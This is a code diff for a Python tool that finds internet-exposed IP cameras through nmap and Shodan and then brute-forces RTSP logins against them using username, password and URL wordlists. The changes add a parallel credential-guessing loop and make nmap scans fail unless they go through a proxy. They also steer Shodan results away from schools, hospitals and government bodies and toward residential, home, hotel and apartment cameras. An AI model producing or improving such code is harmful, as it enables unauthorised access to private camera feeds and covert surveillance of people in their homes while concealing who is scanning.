@@ -1,177 +1,362 @@
-import base64
-import configparser
 import itertools
-import random
 import logging
-
+import random
 from abc import ABC, abstractmethod
-from typing import Dict, Union
+from concurrent.futures import ThreadPoolExecutor
+from typing import Dict
 
-import cv2
 import nmap
 import shodan
+from pydantic import BaseModel, ConfigDict, Field
 from shodan import APIError
 
-__version__ = '0.1.0'
-
 from models.camera import Camera
-from models.managers import CameraManager
-from wordlists.proxy_downloader import ProxyDownloader
+from models.managers import CameraRepository
+from scanners.config import CheckersConfig, NmapConfig, ShodanConfig
+from scanners.proxy import TwoCaptchaProxy
+from scanners.rtsp_probe import RtspProbe, RtspTarget
+
+__version__ = "0.1.0"
+
+# nmap --proxies only relays through HTTP/SOCKS4 (see `nmap --help`); a socks5
+# proxy is rejected, so NmapTask must be given one of these.
+_NMAP_PROXY_SCHEMES = ("http", "socks4", "socks4a")
+
+# nmap's port state for a service that accepted the connection.
+_OPEN_STATE = "open"
+
+
+class UnsupportedProxySchemeError(Exception):
+    """nmap cannot relay this proxy scheme, so the scan would run un-proxied."""
+
+
+class _Location(BaseModel):
+    model_config = ConfigDict(extra="ignore")
+
+    city: str | None = None
+    country_code: str | None = None
+    country_name: str | None = None
+    region_code: str | None = None
+
+
+class ShodanBanner(BaseModel):
+    """The subset of a Shodan search banner this scanner cares about."""
+
+    model_config = ConfigDict(extra="ignore")
+
+    ip_str: str
+    port: int
+    location: _Location = Field(default_factory=_Location)
+    org: str = ""  # ISP/org name from Shodan
+    hostnames: list[str] = Field(default_factory=list)
+    tags: list[str] = Field(default_factory=list)
 
 
 class Task(ABC):
-    """
-    Abstract class for tasks, need implement run method
-    """
-    def __init__(self, config: configparser.SectionProxy, proxy_downloader: ProxyDownloader):
-        if not config:
-            raise ValueError('Config dict is required')
-        self.config = self.parse_parameters(config)
-        self.db_manager = CameraManager()
-        self.proxy_downloader = proxy_downloader
+    """Base task: holds a validated config model and a camera repository."""
+
+    def __init__(self, config: BaseModel, repository: CameraRepository = None):
+        if config is None:
+            raise ValueError("Config is required")
+        self.config = config
+        self.repository = repository or CameraRepository()
 
     @abstractmethod
-    def run(self):
-        raise NotImplementedError('You must implement the run method')
-
-    def parse_parameters(self, parameters: configparser.SectionProxy) -> Dict:
-        """
-        Parse parameters from config ini file
-        """
-        config = {}
-        for p in parameters.keys():
-            config[p] = parameters[p]
-        return config
-
-    def save_image_on_disk(self, image_b64: str, path: str) -> None:
-        """
-        Save image on disk
-        :param image_b64: string with base64 image
-        :param path: path to save image
-        :return: None
-        """
-        with open(path, 'wb') as f:
-            f.write(base64.b64decode(image_b64))
-
-    def check_rtsp_connection_by_host(self, **kwargs) -> Union[Camera, None]:
-        """
-        Check if a camera is accessible by rtsp protocol
-        :param kwargs: host, port, user, password, rtsp_string
-        :return: Camera object if connection is successful, None otherwise
-        """
-        host = kwargs.get('host')
-        port = kwargs.get('port')
-        user = kwargs.get('user')
-        password = kwargs.get('password')
-        rtsp_string = kwargs.get('rtsp_string')
-        rtsp_url = rtsp_string.format(user, password, host, port)
-        logging.debug(f'{rtsp_url}')
-
-        vcap = cv2.VideoCapture(rtsp_url)
-        ret, frame = vcap.read()
-        if not ret:
-            logging.debug(f'No frame for {rtsp_url}')
-            return None
-
-        logging.info(f'[!] {rtsp_url}, user: {user}, password: {password}')
-        image_b64 = cv2.imencode('.jpg', frame)[1].tobytes()
-
-        return Camera(ip=host, port=port, user=user, password=password, url=rtsp_url, active=True, image_b64=image_b64)
+    def run(self) -> None:
+        raise NotImplementedError("You must implement the run method")
 
 
 class NmapTask(Task):
-    """
-    Scan for cameras on a given network using nmap, take a screenshot and add it to the database
-    """
+    """Scan a network range with nmap and store the hosts that answer on RTSP."""
 
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-        self.nm = nmap.PortScanner()
+    def __init__(
+        self,
+        config: NmapConfig,
+        proxy: TwoCaptchaProxy = None,
+        repository: CameraRepository = None,
+    ):
+        super().__init__(config, repository)
+        self.proxy = proxy
+        self.scanner = nmap.PortScanner()
 
-    def run(self):
-        ip_range = self.config.get('ip_range')
-        logging.info(f'Starting nmap scanning on {ip_range}')
+    def run(self) -> None:
+        logging.info(f"Starting nmap scanning on {self.config.ip_range}")
 
-        hosts = self.scan(ip_range)
-        logging.info(f'Found {len(hosts)} hosts using nmap scan')
+        hosts = self._scan(self.config.ip_range)
+        logging.info(f"Found {len(hosts)} hosts using nmap scan")
 
-        for h in hosts:
-            for port in hosts[h]['tcp']:
-                self.db_manager.insert_into_cameras(ip=h, port=port)
-                logging.debug(f'Added on db {h}:{port}')
-        logging.info(f'Executors: finished in thread_nmap_scan')
+        self._write_xml()
+        for host, host_data in hosts.items():
+            self._store_open_ports(host, host_data)
+        logging.info("Executors: finished nmap scan")
 
-    def scan(self, target):
-        proxies = self.proxy_downloader.proxies
-        parsed_proxies = ','.join([f'{p["ip"]}:{p["port"]}' for p in proxies])
-        response = self.nm.scan(hosts=target, arguments=f'-p 554 -sV --proxies {parsed_proxies}')
-        return response.get('scan')
+    def _write_xml(self) -> None:
+        """Keep the run's raw nmap XML, where the vuln mode reads it.
+
+        python-nmap owns the XML: it rejects an `-oX` argument of ours, so the
+        only way to keep the run's output is to ask it for the last one it made.
+        That is the raw stdout of `nmap -oX -`, so it is bytes, despite the
+        method's docstring saying string.
+        """
+        with open(self.config.xml_path, "wb") as handle:
+            handle.write(self.scanner.get_nmap_last_output())
+        logging.info(f"nmap XML written to {self.config.xml_path}")
+
+    def _store_open_ports(self, host: str, host_data: Dict) -> None:
+        """Store the host's open ports only.
+
+        nmap reports every scanned port, closed and filtered included; only an
+        open one is a camera, otherwise each live host lands in the DB as a
+        camera the check task then burns a full credential run on.
+        """
+        for port, port_data in host_data.get("tcp", {}).items():
+            if port_data["state"] != _OPEN_STATE:
+                continue
+            self.repository.insert_camera(Camera(ip=host, port=port))
+            logging.debug(f"Added on db {host}:{port}")
+
+    def _scan(self, target: str) -> Dict:
+        arguments = f"-p 554 -sV{self._proxy_arguments()}"
+        if self.config.parallelism > 0:
+            arguments += f" -T4 --min-parallelism {self.config.parallelism}"
+        response = self.scanner.scan(hosts=target, arguments=arguments)
+        return response.get("scan")
+
+    def _proxy_arguments(self) -> str:
+        """`--proxies <url>`, or nothing when no proxy is configured.
+
+        No proxy is a deliberate direct scan (proxy.enabled: false). With one
+        set, a scheme nmap cannot relay raises instead of quietly dropping the
+        flag, so a public scan never runs un-proxied by accident.
+        """
+        if self.proxy is None:
+            return ""
+        proxy_url = self.proxy.url()
+        scheme = proxy_url.split("://", 1)[0].lower()
+        if scheme not in _NMAP_PROXY_SCHEMES:
+            raise UnsupportedProxySchemeError(
+                f"nmap --proxies supports {_NMAP_PROXY_SCHEMES}, got {scheme!r}; "
+                "give NmapTask an http proxy (TwoCaptchaSettings(protocol='http')). "
+                "Failing loud so the scan never silently runs un-proxied."
+            )
+        return f" --proxies {proxy_url}"
 
 
 class ShodanTask(Task):
-    """
-    Search for cameras on Shodan, take a screenshot and add it to the database
-    """
-    def run(self):
-        shodan_key = self.config.get('shodan_key')
-        api = shodan.Shodan(shodan_key)
-        query = 'screenshot.label:webcam,cam country:BR'
-        results = api.search_cursor(query)
-        logging.info('Updating database')
+    """Search Shodan for cameras and store the new ones in the database."""
+
+    config: ShodanConfig
+
+    _BLOCKED_ORGS: frozenset[str] = frozenset(
+        {
+            "university",
+            "college",
+            "school",
+            "education",
+            "hospital",
+            "medical",
+            "clinic",
+            "government",
+            "military",
+            "municipality",
+            "library",
+            "museum",
+            "church",
+            "mosque",
+            "at&t",
+            "comcast",
+            "verizon",
+            "spectrum",
+            "xfinity",
+            "charter",
+            "cox",
+            "frontier",
+        }
+    )
+
+    _BLOCKED_TAGS: frozenset[str] = frozenset(
+        {
+            "university",
+            "college",
+            "school",
+            "education",
+            "hospital",
+            "medical",
+            "clinic",
+            "government",
+            "military",
+            "municipality",
+            "library",
+            "museum",
+            "church",
+            "mosque",
+        }
+    )
+
+    _PRIORITY_TAGS: frozenset[str] = frozenset(
+        {
+            "residential",
+            "home",
+            "office",
+            "business",
+            "company",
+            "enterprise",
+            "corporate",
+            "apartment",
+            "hotel",
+            "motel",
+        }
+    )
+
+    _PRIORITY_ORGS: frozenset[str] = frozenset(
+        {
+            "comcast",
+            "verizon",
+            "at&t",
+            "spectrum",
+            "xfinity",
+            "charter",
+            "cox",
+            "frontier",
+        }
+    )
+
+    def run(self) -> None:
+        api = shodan.Shodan(self.config.api_key)
+        query = self.config.query
+        logging.info("Updating database")
+
         cams_added = 0
         try:
-            for banner in results:
-                ip, port = banner.get('ip_str'), banner.get('port')
-                db_response = self.db_manager.search_on_db(ip, port)
-                if not db_response:
-                    city = banner.get('location').get('city')
-                    country_code = banner.get('location').get('country_code')
-                    country_name = banner.get('location').get('country_name')
-                    region_code = banner.get('location').get('region_code')
-                    self.db_manager.insert_into_cameras(
-                        ip=ip, port=port, city=city, country_code=country_code,
-                        country_name=country_name, region_code=region_code
+            for raw in api.search_cursor(query):
+                banner = ShodanBanner(**raw)
+                if self.repository.find(banner.ip_str, banner.port):
+                    continue
+                category = self._classify_banner(banner)
+                if category is None:
+                    logging.debug(
+                        "Skipped %s:%d (blocked org/tag)", banner.ip_str, banner.port
                     )
-                    logging.debug(f'{ip}:{port} added')
-                    cams_added += 1
-            logging.info(f'{cams_added} cameras added')
+                    continue
+                if category == "low":
+                    if not self._should_skip_low_priority():
+                        continue
+                self.repository.insert_camera(
+                    Camera(
+                        ip=banner.ip_str,
+                        port=banner.port,
+                        city=banner.location.city,
+                        country_code=banner.location.country_code,
+                        country_name=banner.location.country_name,
+                        region_code=banner.location.region_code,
+                    )
+                )
+                logging.debug(
+                    "%s:%d added (priority=%s)", banner.ip_str, banner.port, category
+                )
+                cams_added += 1
+            logging.info(f"{cams_added} cameras added")
         except APIError as e:
-            logging.error(f'Shodan api error: {e}')
-        except Exception as e:
-            logging.error(f'Error: {e}')
+            logging.error(f"Shodan api error: {e}")
+
+    _LOW_PRIORITY_COUNT: int = 0
+    _LOW_PRIORITY_LIMIT: int = 50
+
+    @classmethod
+    def _should_skip_low_priority(cls) -> bool:
+        cls._LOW_PRIORITY_COUNT += 1
+        return cls._LOW_PRIORITY_COUNT > cls._LOW_PRIORITY_LIMIT
+
+    @classmethod
+    def _classify_banner(cls, banner: ShodanBanner) -> str | None:
+        """Classify a Shodan banner into priority tier."""
+        org_lower = banner.org.lower() if banner.org else ""
+        tags_lower = {tag.lower() for tag in banner.tags}
+        hostnames_lower = {hostname.lower() for hostname in banner.hostnames}
+        if cls._is_blocked_org(org_lower):
+            return None
+        if cls._has_blocked_tag(tags_lower):
+            return None
+        if cls._has_blocked_hostname(hostnames_lower):
+            return None
+        if cls._is_priority_org(org_lower):
+            return "high"
+        if cls._has_priority_tag(tags_lower):
+            return "high"
+        return "medium"
+
+    @classmethod
+    def _is_blocked_org(cls, org_lower: str) -> bool:
+        return org_lower in cls._BLOCKED_ORGS
+
+    @classmethod
+    def _has_blocked_tag(cls, tags_lower: set[str]) -> bool:
+        return bool(tags_lower & cls._BLOCKED_TAGS)
+
+    @classmethod
+    def _has_blocked_hostname(cls, hostnames_lower: set[str]) -> bool:
+        for hostname in hostnames_lower:
+            domain = hostname.split(".")[-1]
+            if domain in cls._BLOCKED_TAGS:
+                return True
+        return False
+
+    @classmethod
+    def _is_priority_org(cls, org_lower: str) -> bool:
+        return org_lower in cls._PRIORITY_ORGS
+
+    @classmethod
+    def _has_priority_tag(cls, tags_lower: set[str]) -> bool:
+        return bool(tags_lower & cls._PRIORITY_TAGS)
 
 
 class CheckTask(Task):
-    """
-    Check cameras on database for rtsp stream and take a screenshot, adding it to the database
-    """
+    """Try RTSP credential combinations against inactive cameras in the database."""
 
-    def run(self):
-        logging.info(f'Starting check task')
-        users_wordlist = self.config.get('wordlist_users')
-        passwords_wordlist = self.config.get('wordlist_passwords')
-        rtsp_urls_wordlist = self.config.get('wordlist_rtsp_urls')
-        randomize = bool(self.config.get('randomize'))
+    def __init__(
+        self,
+        config: CheckersConfig,
+        repository: CameraRepository = None,
+        probe: RtspProbe = None,
+    ):
+        super().__init__(config, repository)
+        self.probe = probe or RtspProbe()
 
-        camera_users = open(users_wordlist, 'r').read().splitlines()
-        camera_passwords = open(passwords_wordlist, 'r').read().splitlines()
-        rtsp_url_type = open(rtsp_urls_wordlist, 'r').read().splitlines()
+    def run(self) -> None:
+        logging.info("Starting check task")
+        users = self._read_lines(self.config.wordlist_users)
+        passwords = self._read_lines(self.config.wordlist_passwords)
+        rtsp_urls = self._read_lines(self.config.wordlist_rtsp_urls)
 
-        if randomize:
-            random.shuffle(camera_users)
-            random.shuffle(camera_passwords)
-            random.shuffle(rtsp_url_type)
+        if self.config.randomize:
+            random.shuffle(users)
+            random.shuffle(passwords)
+            random.shuffle(rtsp_urls)
 
-        cameras = self.db_manager.get_random_from_db()
-        logging.debug(f'Testing {len(cameras)} cameras')
-        camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
-        for url, user, password, camera in camera_combinations:
-            ip = camera.ip
-            port = camera.port
-            url_login = url.format(user, password, ip, port)
-            connected = self.check_rtsp_connection_by_host(
-                host=ip, port=port, user=user, password=password, rtsp_string=url_login
+        cameras = self.repository.get_random_inactive()
+        logging.debug(f"Testing {len(cameras)} cameras")
+
+        combinations = itertools.product(rtsp_urls, users, passwords, cameras)
+        targets = (
+            RtspTarget(
+                host=camera.ip,
+                port=camera.port,
+                user=user,
+                password=password,
+                url_template=url_template,
             )
-            if connected:
-                self.db_manager.set_active(connected)
-        logging.info(f'Executors: finished in thread_test_cameras')
+            for url_template, user, password, camera in combinations
+        )
+        # concurrency workers probe in parallel (I/O-bound); results are consumed
+        # here on one thread so set_active stays serial. map preserves order and
+        # pulls the target generator lazily, so all combos are never materialised.
+        with ThreadPoolExecutor(max_workers=self.config.concurrency) as pool:
+            for found in pool.map(self.probe.probe, targets):
+                if found:
+                    self.repository.set_active(found)
+        logging.info("Executors: finished testing cameras")
+
+    @staticmethod
+    def _read_lines(path):
+        with open(path, "r") as f:
+            return f.read().splitlines()
